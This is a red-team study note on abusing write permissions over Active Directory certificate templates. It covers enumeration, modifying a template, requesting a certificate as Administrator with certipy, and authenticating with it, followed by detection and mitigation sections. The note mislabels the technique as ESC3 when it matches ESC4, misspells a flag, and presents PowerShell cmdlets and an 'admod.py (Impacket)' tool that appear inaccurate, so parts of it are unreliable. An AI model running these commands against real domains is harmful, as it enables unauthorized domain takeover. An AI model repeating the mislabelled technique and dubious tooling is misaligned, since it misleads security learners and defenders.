---
tags:
  - attack
  - knowledge
  - AD
  - windows
  - redteam
date: 2023-09-1
---
- Escalation path in [[ADCS (Active Directory Certificate Services)|AD CS]]. 
- Attacker does not abuse existing vulnerable templates:
	- they make one vulnerable.
- Attacker has `Write` or `Full Control` permissions on a cert template:
	- modify it to enable spoofing (e.g [[ESC1]]/[[ESC2]]) or grant themselves enroll rights.
	- lets them:
		- modify template flags like `ENROLLEE_SUPPLIER_SUBJECT`.
		- add client authentication EKU.
		- enable dangerous options like SAN spoofing.
		- grant themselves or others enroll permissions.
# Background

- [[Certificate Template|Templates]] are stored in AD, not on the CA directly meaning:
	- they are regular AD objects in configuration partition.
	- they have discretionary [[ACL (Access Control List)|ACLs]].
- If you have:
	- `Write` or `GenericAll` rights over template object
	- OR a `WriteProperty` permission on key attributes.
- You can:
	- modify the template.
	- add yourself to enroll/read ACL.
	- enable attributes.
	- abuse it.

>[!info]
>ESC3 is a precursor attack - it creates the conditions needed for ESC1/2/4/6/10 and others by manipulating templates directly.
# Modifiable Template Features

- Check ACLs on the template object.
- If user/group has:
	- `GenericAll`
	- `Write`
	- `WriteProperty` on:
		- `msPKI-Certificate-Name-Flag`
		- `pKIExtendedKeyUsage`
		- `ntSecurityDescriptor`
- You can modify the template.
- Templates live:
	- `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com`
# Exploitation

- Find modifiable templates:
	- `certipy-ad find -u user@domain -p pass -dc-ip <ip> -vulnerable`
- Manually enumerate template permissions with:

```powershell
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" `
  -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties nTSecurityDescriptor | ForEach-Object {
    # Use ACL scanner or PowerView to analyze ACLs
  }
```

- Use [[BloodHound]] to identify `WriteProperty`/`GenericAll` edges on templates.
- Use PKIView or `admod.py` to:
	- Set `ENROLLEE_SUPPLIES_SUBJECT` flag
	- Add Client Authentication EKU
	- Grant yourself Enroll permissions
- Powershell can also be used:

```powershell
Set-CertificateTemplate -Name "TargetTemplate" -SubjectNameFlag EnrolleeSuppliesSubject
Add-CertificateTemplateEku -Name "TargetTemplate" -Eku ClientAuthentication
Add-TemplateAcl -TemplateName "TargetTemplate" -Principal "lowprivuser" -AccessRights Enroll
```

- Or `admod.py` (Impacket):
	- `admod.py -k -no-pass domain/user@dc "CN=VulnTemplate,...":msPKI-Certificate-Name-Flag=134217728`.
- Finally, abuse it via ESC1/ESC2:
	- `certipy req -u user@domain -p pass -template VulnTemplate -ca CA01\corp-CA -upn Administrator@domain.local -dc-ip <ip> -output esc3`
	- `certipy auth -pfx esc3.pfx -dc-ip <ip>`
# Detection

- `Event ID 4899`: Template modified
- Change in ACLs or EKUs on a template
- Unusual use of `ENROLLEE_SUPPLIES_SUBJECT` on templates that didn’t have it before
- Certificate issuance (`Event ID 4886`) from newly vulnerable templates
- Monitor:
	- Changes to `pKIExtendedKeyUsage`
	- Changes to `msPKI-Certificate-Name-Flag`
	- ACLs that allow non-admins to modify templates
# Mitigation

- Audit template ACLs
	- No users/groups should have `Write`, `FullControl`, `WriteDACL`, or `WriteProperty`
	- Especially not Authenticated Users or Domain Users
- Monitor template changes
	- Use Windows Event Logs (`Event ID 4899`) or directory auditing
- Restrict template management
	- Only PKI admins or Enterprise Admins should be able to change template settings
- Periodically dump and diff template configs
	- Spot stealthy abuse of EKUs or subject flags